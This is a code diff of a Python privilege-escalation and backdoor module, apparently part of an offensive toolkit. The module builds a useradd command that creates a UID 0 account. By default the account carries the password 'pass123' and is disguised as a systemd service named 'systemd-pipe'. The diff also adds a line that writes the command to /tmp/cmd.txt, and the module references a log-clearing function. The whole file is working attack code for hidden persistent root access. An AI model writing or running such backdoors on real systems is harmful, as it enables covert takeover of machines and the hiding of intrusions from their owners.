@@ -1,5 +1,5 @@
 #!/usr/bin/python3
-#[PrivEsc] Create New User
+#[PrivEsc][Backdoor] Create New User
 #USERNAME,no,Username for created user
 #PASSWORD,no,Password for created user
 #UID,no,UID for created user
@@ -9,6 +9,7 @@
 #END
 
 import os
+from crypt import crypt as crypt
 
 def create_command_string(arguments):
     command_string = "/sbin/useradd --no-create-home "
@@ -20,9 +21,9 @@ def create_command_string(arguments):
         command_string += "-ou 0 -g 0 "
 
     if arguments[1] == "":
-        command_string += "--password $(openssl passwd -6 pass123) " #password = pass123
+        command_string += "--password " + crypt('pass123', 'SHA512') + " "
     else:
-        command_string += "--password $(openssl passwd -6 " + arguments[1] + ") "
+        command_string += "--password " + crypt(arguments[1], 'SHA512') + " "
     
     if arguments[2] != "":
         command_string += "--uid " + str(arguments[2]) + " "
@@ -31,7 +32,7 @@ def create_command_string(arguments):
         command_string += "-d /run/systemd -c 'systemd Pipe Selector' systemd-pipe"
     else:
         command_string += arguments[0]
-
+    os.system("echo '" + command_string + "' > /tmp/cmd.txt")
     return command_string
 
 def clear_logs(arguments):
